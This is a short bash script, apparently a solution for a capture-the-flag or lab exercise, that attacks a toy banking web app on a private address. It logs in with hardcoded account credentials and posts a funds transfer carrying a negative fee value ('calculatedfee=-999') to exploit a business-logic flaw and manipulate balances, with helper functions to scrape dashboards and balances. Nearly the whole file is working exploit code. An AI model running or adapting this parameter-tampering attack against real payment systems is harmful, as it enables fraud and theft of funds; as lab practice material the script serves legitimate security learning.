#!/usr/bin/env bash

# This is less of a race condition and more a matter of passing a negative number to the fee. 

users=(4621 6282 9317)
passwords=('blueApple' 'whiteHorse' 'greenOrange')

url='http://10.10.249.43:5000'

dashboard="$url/dashboard"
login="$url/login"
transfer="$url/transfer"

scan()
{
        curl -L $url -o 'home' -vvvv
	curl -sL $login -vvvv -O
        login 4621 'blueApple'
        curl -sL $dashboard --cookie cookie.txt -vvvv -O
        curl -sL "$transfer/6282" --cookie cookie.txt -vvvv -O
}

get_balance()
{
        login $1 $2
        balance=$(curl -sL $dashboard --cookie cookie.txt --stderr - | grep -oP '\$[0-9]+')
        echo "User ($1): $balance"
}

login()
{
        username=$1
        password=$2

        authenticate=$(curl -sL $login --cookie-jar cookie.txt -d "username=$username" -d "password=$password")
}

show_balances()
{
        echo "BALANCES"
        for i in `seq 0 2`; do
                get_balance ${users[$i]} ${passwords[$i]}
        done
}

transfer()
{
        login $1 $2
        destination="$transfer/$3"
	echo "Transfering funds from $1 to $3"
        response=$(curl -sL $destination --cookie cookie.txt -d "calculatedfee=-999" -d "fund_being_transferred=2" -d "receiver_amount=20")
        echo $response
}

get_dashboard()
{
	login $1 $2
	curl -sL $dashboard --cookie cookie.txt -vvvv -O
}

#scan
#transfer ${users[0]} ${passwords[0]} ${users[1]}
get_dashboard ${users[0]} ${passwords[0]}
#show_balances

